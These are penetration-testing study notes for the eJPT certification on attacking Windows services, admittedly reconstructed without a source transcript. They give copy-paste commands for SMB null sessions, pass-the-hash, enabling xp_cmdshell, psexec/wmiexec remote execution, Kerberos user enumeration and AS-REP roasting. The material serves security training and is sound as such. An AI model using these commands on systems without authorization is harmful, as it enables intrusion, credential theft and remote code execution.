# Frequently Exploited Windows Services (eJPT Study Notes)

Note: No transcript was provided. The following summary is inferred conservatively from the filename and typical eJPT Vulnerability Assessment coverage. Commands are standard, copy-paste friendly, and intended for lab/authorized environments only.

## What the video covers (Introduction / big picture)
- The Windows network services attackers most often target during vulnerability assessment and initial access.
- How to quickly detect these services, enumerate them safely, and identify low-hanging misconfigurations and exposures.
- Service-specific checks for SMB, RDP, WinRM, MSSQL, IIS/HTTP, FTP, LDAP/Kerberos/AD and RPC/WMI.
- How to pivot from enumeration to authenticated remote code execution when valid credentials are obtained.

## Flow (ordered)
1. Identify Windows hosts and scope targets (host discovery).
2. Run a focused TCP service scan and light OS detection.
3. Prioritize Windows-heavy ports/services for deeper enumeration:
   - SMB (445/139), RPC (135)
   - RDP (3389)
   - WinRM (5985/5986)
   - MSSQL (1433)
   - HTTP(S) IIS (80/443)
   - FTP (21)
   - LDAP/LDAPS (389/636) and Kerberos (88) on AD networks
4. Use NSE scripts and specialized tools per service to extract version info, shares, users, and common misconfigs.
5. If credentials are found, validate across SMB/WinRM/MSSQL, then attempt safe, authenticated remote command execution.
6. Document findings, versions, and weak configurations that indicate practical exploitation paths.

## Tools highlighted
- Nmap (+ NSE scripts)
- smbclient, smbmap, enum4linux/enum4linux-ng, rpcclient
- CrackMapExec (cme)
- Impacket tools: psexec.py, wmiexec.py, smbexec.py, mssqlclient.py, GetNPUsers.py, rpcdump.py
- evil-winrm
- whatweb, nikto, gobuster/feroxbuster, davtest/cadaver (IIS/WebDAV)
- ftp/lftp, hydra/ncrack (with caution)
- ldapsearch, windapsearch.py, kerbrute
- nbtscan/fping (discovery)

## Typical command walkthrough (detailed, copy-paste friendly)

Set handy variables first:
```bash
export TARGET=10.10.10.10
export DOMAIN=example.local
export USER='administrator'
export PASS='Password123!'
```

1) Discovery and focused scan
```bash
# Find live hosts (choose one)
fping -a -g 10.10.10.0/24 2>/dev/null
nbtscan -r 10.10.10.0/24
nmap -n -sn -PS445,3389 10.10.10.0/24

# Focused TCP scan for Windows-heavy ports
nmap -n -Pn -sS -sV -O -T4 -p 21,80,135,139,389,445,443,1433,3389,5985,5986,636,88,53 $TARGET
```

2) SMB (139/445) enumeration and common vulns
```bash
# Fast overview and version
nmap -p445 --script "smb-os-discovery,smb2-security-mode" $TARGET

# Shares, users
nmap -p445 --script "smb-enum-shares,smb-enum-users" $TARGET

# MS17-010 check (safe detection)
nmap -p445 --script smb-vuln-ms17-010 $TARGET

# SMB signing status (relay relevance)
nmap -p445 --script smb2-security-mode $TARGET

# Null session share list
smbclient -N -L "//$TARGET/"

# Try anonymous/guest access to a found share
smbclient -N "//$TARGET/SHARENAME"

# Broad enum
smbmap -H $TARGET
enum4linux-ng -A $TARGET -oA enum4-$TARGET

# Null/guest RPC to pull users/groups
rpcclient -U "" $TARGET -c "enumdomusers"
rpcclient -U "" $TARGET -c "enumdomgroups"

# Validate creds, list shares, run a command
crackmapexec smb $TARGET -d $DOMAIN -u $USER -p "$PASS" --shares
crackmapexec smb $TARGET -d $DOMAIN -u $USER -p "$PASS" -x "whoami"
# Pass-the-hash example
crackmapexec smb $TARGET -d $DOMAIN -u $USER -H 'aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99' --shares
```

3) RDP (3389)
```bash
# Basic info
nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info $TARGET

# Attempt connection (requires valid creds)
xfreerdp /v:$TARGET /u:$DOMAIN\\$USER /p:"$PASS" /dynamic-resolution /cert:ignore +clipboard
# If NLA/TLS issues:
xfreerdp /v:$TARGET /u:$DOMAIN\\$USER /p:"$PASS" /cert:ignore /tls-seclevel:0
```

4) WinRM (5985/5986)
```bash
# Probe
nmap -p5985,5986 --script http-title,http-headers $TARGET

# Validate creds and execute a command
crackmapexec winrm $TARGET -d $DOMAIN -u $USER -p "$PASS" -x "whoami"

# Interactive PowerShell if allowed
evil-winrm -i $TARGET -u $USER -p "$PASS"
# With NTLM hash (if supported by your Evil-WinRM build)
# evil-winrm -i $TARGET -u $USER -H 'NTLMHASH'
```

5) MSSQL (1433)
```bash
# Discovery and weak creds
nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password --script-args=mssql.instance-all $TARGET
# (Optional brute — use caution)
# nmap -p1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt $TARGET

# SQL auth (e.g., sa)
impacket-mssqlclient sa:'Password1!'@$TARGET

# Windows auth (domain user)
impacket-mssqlclient $DOMAIN/$USER:"$PASS"@$TARGET -windows-auth

# Enable and use xp_cmdshell (inside mssqlclient prompt)
# SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
# SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
# SQL> xp_cmdshell 'whoami';
```

6) IIS / HTTP(S) (80/443)
```bash
# Fingerprint
whatweb http://$TARGET

# IIS/WebDAV checks and enumeration
nmap -p80,443 --script http-server-header,http-title,http-headers,http-methods,http-webdav-scan,http-enum $TARGET
# WebDAV vulns (legacy)
nmap -p80 --script http-iis-webdav-vuln $TARGET

# Content discovery
gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x asp,aspx,txt,config,bak
# or
feroxbuster -u http://$TARGET -x asp,aspx,txt,config,bak -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# WebDAV test
davtest -url http://$TARGET
```

7) FTP (21)
```bash
# Check for anonymous and banner
nmap -p21 --script ftp-anon,ftp-syst,ftp-banner $TARGET

# Try anonymous login
ftp -inv $TARGET << 'EOF'
user anonymous anonymous@
ls -la
bye
EOF
```

8) LDAP/Kerberos/AD (389/636/88) on domain controllers
```bash
# LDAP anonymous rootDSE
nmap -p389 --script ldap-rootdse,ldap-search --script-args "ldap.username='',ldap.password=''" $TARGET
ldapsearch -x -H ldap://$TARGET -s base namingcontexts

# If you know the base DN
ldapsearch -x -H ldap://$TARGET -b "DC=example,DC=local" "(objectClass=user)" sAMAccountName | head

# User enumeration via Kerberos (timing-aware; may be allowed in lab)
kerbrute userenum -d $DOMAIN --dc $TARGET users.txt

# AS-REP roasting candidates (no preauth)
impacket-GetNPUsers $DOMAIN/ -dc-ip $TARGET -no-pass -usersfile users.txt
```

9) RPC/WMI quick checks
```bash
# RPC info
nmap -p135 --script rpcinfo $TARGET
impacket-rpcdump @${TARGET} | head

# With valid creds: Remote exec paths (choose one)
impacket-wmiexec $DOMAIN/$USER:"$PASS"@$TARGET "whoami"
impacket-psexec $DOMAIN/$USER:"$PASS"@$TARGET cmd.exe
impacket-smbexec $DOMAIN/$USER:"$PASS"@$TARGET "whoami"
```

10) DNS (if the host is a Windows DNS server)
```bash
# Basic zone checks (if allowed)
nslookup -type=soa $DOMAIN $TARGET
nslookup -type=ns $DOMAIN $TARGET
# Zone transfer test (often blocked)
dig AXFR $DOMAIN @$TARGET
```

Paths and references you’ll use often:
- Nmap NSE scripts: /usr/share/nmap/scripts/
- Wordlists: /usr/share/seclists/
- Impacket tools (Kali): /usr/bin/impacket-*
- Evil-WinRM (Kali): /usr/bin/evil-winrm

## Practical tips
- Start focused: Target Windows-heavy ports first; expand to full -p- only as needed.
- Prefer “safe” NSE scripts initially; intrusive checks can crash legacy services.
- Always check SMB shares and RPC with null/guest first; it’s quick and often overlooked.
- Use CrackMapExec to validate credentials across many hosts and protocols efficiently.
- On AD networks, get domain policy (lockout thresholds) before any password guessing. enum4linux-ng and ldapsearch can reveal this.
- RDP brute forcing is noisy and risky; validate one set of creds rather than guessing.
- WinRM is a strong indicator of admin-enabled remote management; if creds work there, you likely have command execution.
- MSSQL often yields command exec via xp_cmdshell; try both SQL and Windows auth.
- IIS + WebDAV frequently leads to upload/write primitives; test methods and DAV.
- Meticulously log each service version and script output; tie findings to known CVEs where appropriate.

## Minimal cheat sheet (one-screen flow)
```bash
# 1) Scan
nmap -n -Pn -sS -sV -O -T4 -p 21,80,135,139,389,445,443,1433,3389,5985,5986,636,88 $TARGET

# 2) SMB
nmap -p445 --script "smb-os-discovery,smb-enum-shares,smb-enum-users,smb2-security-mode,smb-vuln-ms17-010" $TARGET
smbclient -N -L "//$TARGET/"
smbmap -H $TARGET
enum4linux-ng -A $TARGET -oA enum4-$TARGET
crackmapexec smb $TARGET -d $DOMAIN -u $USER -p "$PASS" --shares

# 3) RDP
nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info $TARGET
xfreerdp /v:$TARGET /u:$DOMAIN\\$USER /p:"$PASS" /cert:ignore

# 4) WinRM
crackmapexec winrm $TARGET -d $DOMAIN -u $USER -p "$PASS" -x "whoami"
evil-winrm -i $TARGET -u $USER -p "$PASS"

# 5) MSSQL
nmap -p1433 --script ms-sql-info,ms-sql-empty-password $TARGET
impacket-mssqlclient $DOMAIN/$USER:"$PASS"@$TARGET -windows-auth

# 6) IIS/HTTP
whatweb http://$TARGET
nmap -p80,443 --script http-title,http-headers,http-enum,http-webdav-scan $TARGET
gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -x asp,aspx,txt

# 7) LDAP/AD (DCs)
ldapsearch -x -H ldap://$TARGET -s base namingcontexts
kerbrute userenum -d $DOMAIN --dc $TARGET users.txt
```

## Summary
- The most frequently exploited Windows services in network assessments are SMB, RDP, WinRM, MSSQL, IIS/HTTP, FTP, LDAP/Kerberos/AD, and RPC/WMI.
- Efficient assessments start with a targeted scan, then deep-dive enumeration using NSE and specialized tools per service.
- SMB and RPC often yield shares/users and policy info; RDP/WinRM/MSSQL become RCE paths once creds are validated.
- For AD, LDAP/Kerberos enumeration can reveal users, policies, and roasting opportunities that lead to credentials.
- Keep operations safe and documented; move from discovery to authenticated access with minimal noise.